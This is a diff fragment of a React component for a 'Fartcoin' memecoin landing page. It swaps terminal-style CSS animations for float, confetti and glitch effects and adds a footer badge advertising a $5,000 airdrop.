+            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-1000">
+              💎 $5,000 Airdrop
+            </span>
+          </div>
+          <p className="text-gray-600 text-sm animate-pulse">
+            © 2025 Fartcoin • The Funniest Coin in Crypto
+          </p>
+        </div>
       </div>
 
       {/* Animation Keyframes */}
       <style>{`
-        @keyframes textFlicker {
-          0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, to { opacity: 1; }
-          20%, 21.999%, 63%, 63.999%, 65%, 69.999% { opacity: 0.8; }
+        @keyframes float-slow {
+          0%, 100% { transform: translate(0, 0) scale(1); }
+          33% { transform: translate(30px, -30px) scale(1.1); }
+          66% { transform: translate(-20px, 20px) scale(0.9); }
         }
         
-        @keyframes scan {
-          0% { top: -10px; }
-          to { top: 100%; }
+        @keyframes float-particle {
+          0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0; }
+          10% { opacity: 1; }
+          90% { opacity: 1; transform: translateY(-100vh) translateX(100px) rotate(360deg); }
+          100% { transform: translateY(-120vh) translateX(150px) rotate(720deg); opacity: 0; }
         }
         
-        @keyframes blink {
-          0%, to { opacity: 1; }
-          50% { opacity: 0; }
+        @keyframes float-3d {
+          0%, 100% { transform: translateY(0) rotateX(0deg); }
+          25% { transform: translateY(-30px) rotateX(10deg); }
+          75% { transform: translateY(30px) rotateX(-10deg); }
         }
         
-        @keyframes pulse-glow {
-          0%, 100% { filter: brightness(1); }
-          50% { filter: brightness(1.2); text-shadow: 0 0 20px rgba(255,255,255,0.8); }
+        @keyframes confetti {
+          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
+          100% { transform: rotate(720deg) translateY(-200px) scale(0); opacity: 0; }
         }
         
-        .text-glow {
-          text-shadow: 0 0 5px rgba(255,255,255,0.7), 0 0 10px rgba(255,255,255,0.5);
+        @keyframes confetti-cannon {
+          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+          100% { transform: translateY(-300px) rotate(720deg) translateX(200px); opacity: 0; }
         }
         
-        .terminal-frame {
-          border: 1px solid rgba(255,255,255,0.5);
-          box-shadow: 0 0 10px rgba(255,255,255,0.5);
+        @keyframes confetti-spiral {
+          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
+          100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
+        }
+        
+        @keyframes bounce-subtle {
+          0%, 100% { transform: translateY(0) translateX(-50%); }
+          50% { transform: translateY(-10px) translateX(-50%); }
+        }
+        
+        @keyframes draw-circle {
+          0% { stroke-dashoffset: 500; opacity: 0; }
+          50% { stroke-dashoffset: 250; opacity: 1; }
+          100% { stroke-dashoffset: 0; opacity: 0; }
+        }
+        
+        @keyframes dash {
+          to { stroke-dashoffset: 0; }
+        }
+        
+        @keyframes attention-glow {
+          0%, 100% { filter: drop-shadow(0 0 5px rgba(249,115,22,0.5)); }
+          50% { filter: drop-shadow(0 0 30px rgba(249,115,22,0.8)); }
+        }
+        
+        @keyframes pointing-finger {
+          0%, 100% { transform: translateY(0) scale(1); }
+          50% { transform: translateY(-15px) scale(1.2); }
+        }
+        
+        .animate-float-slow { animation: float-slow 20s ease-in-out infinite; }
+        .animate-float-slower { animation: float-slow 25s ease-in-out infinite reverse; }
+        .animate-float { animation: float-slow 15s ease-in-out infinite; }
+        .animate-float-particle { animation: float-particle 15s linear infinite; }
+        .animate-float-3d { animation: float-3d 6s ease-in-out infinite; }
+        .animate-confetti { animation: confetti 1s ease-out forwards; }
+        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
+        .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
+        .animate-ping-slow { animation: ping-slow 3s cubic-bezier(0, 0, 0.2, 1) infinite; }
+        .animate-spin-slow { animation: spin-slow 20s linear infinite; }
+        .animate-spin-slower { animation: spin-slower 25s linear infinite; }
+        .animate-spin-slowest { animation: spin-slowest 30s linear infinite; }
+        .animate-spin-3d { animation: spin-3d 3s linear infinite; }
+        .animate-spin-3d-reverse { animation: spin-3d-reverse 3s linear infinite; }
+        .animate-gradient-x { animation: gradient-x 3s ease infinite; background-size: 200% 200%; }
+        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
+        .animate-pulse-text { animation: pulse-text 2s ease-in-out infinite; }
+        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
+        .animate-fadeIn { animation: fadeIn 0.5s ease-out; }
+        .animate-scaleIn { animation: scaleIn 0.5s ease-out; }
+        .animate-slideIn { animation: slideIn 0.5s ease-out; }
+        .animate-shake { animation: shake 0.5s ease-in-out; }
+        .animate-shimmer { animation: shimmer 2s infinite; }
+        .animate-border-pulse { animation: border-pulse 2s ease-in-out infinite; }
+        .animate-bounce-3d { animation: bounce-3d 2s ease-in-out infinite; }
+        .animate-particle-burst { animation: particle-burst 1s ease-out forwards; }
+        .animate-bounce-subtle { animation: bounce-subtle 2s ease-in-out infinite; }
+        .animate-pointing-finger { animation: pointing-finger 1.5s ease-in-out infinite; }
+        .animate-draw-circle { animation: draw-circle 3s ease-in-out infinite; }
+        .animate-attention-glow { animation: attention-glow 2s ease-in-out infinite; }
+        .animate-dash { stroke-dasharray: 500; stroke-dashoffset: 500; animation: dash 3s linear infinite; }
+        
+        .animation-delay-500 { animation-delay: 500ms; }
+        .animation-delay-1000 { animation-delay: 1000ms; }
+        .animation-delay-2000 { animation-delay: 2000ms; }
+        .animation-delay-4000 { animation-delay: 4000ms; }
+        
+        .perspective-1000 { perspective: 1000px; }
+        .rotate-y-12 { transform: rotateY(12deg); }
+        
+        .glitch {
           position: relative;
         }
         
-        .terminal-frame::before {
-          content: "";
+        .glitch::before,
+        .glitch::after {
+          content: attr(data-text);
           position: absolute;
           top: 0;
           left: 0;
-          right: 0;
-          bottom: 0;
-          border: 1px dashed rgba(255,255,255,0.7);
-          pointer-events: none;
-          margin: 3px;
-        }
-        
-        .scan-effect {
-          position: relative;
-          overflow: hidden;
-        }
-        
-        .scan-effect::after {
-          content: "";
-          position: absolute;
-          top: -100%;
-          left: 0;
           width: 100%;
-          height: 10px;
-          background: linear-gradient(180deg, transparent, rgba(255,255,255,0.2), transparent);
-          animation: scan 4s linear infinite;
+          height: 100%;
+          background: inherit;
+          clip: rect(0, 0, 0, 0);
         }
         
-        .cursor {
-          display: inline-block;
-          width: 0.6ch;
-          height: 1em;
-          background: white;
-          margin-left: 2px;
-          animation: blink 1s step-end infinite;
+        .glitch:hover::before {
+          left: 2px;
+          text-shadow: -2px 0 #ff00c1;
+          animation: glitch-1 0.3s infinite linear alternate-reverse;
         }
         
-        .animate-flicker {
-          animation: textFlicker 3s infinite alternate;
+        .glitch:hover::after {
+          left: -2px;
+          text-shadow: 2px 0 #00fff9;
+          animation: glitch-2 0.3s infinite linear alternate-reverse;
         }
         
-        .animate-pulse-glow {
-          animation: pulse-glow 2s ease-in-out infinite;
+        @keyframes glitch-1 {
+          0% { clip: rect(20px, 9999px, 20px, 0); }
+          100% { clip: rect(80px, 9999px, 140px, 0); }
         }
         
-        .glow-on-hover:hover {
-          text-decoration: underline;
-          text-shadow: 0 0 5px rgba(255,255,255,0.6), 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(255,255,255,0.3);
-        }
-        
-        .font-terminal {
-          font-family: 'VT323', monospace;
-        }
-        
-        .font-mono {
-          font-family: 'Fira Code', monospace;
-        }
-        
-        .animation-delay-500 {
-          animation-delay: 500ms;
-        }
-        
-        @media (max-width: 479px) {
-          .hide-mobile {
-            display: none !important;
-          }
+        @keyframes glitch-2 {
+          0% { clip: rect(40px, 9999px, 70px, 0); }
+          100% { clip: rect(100px, 9999px, 130px, 0); }
         }
       `}</style>
     </div>
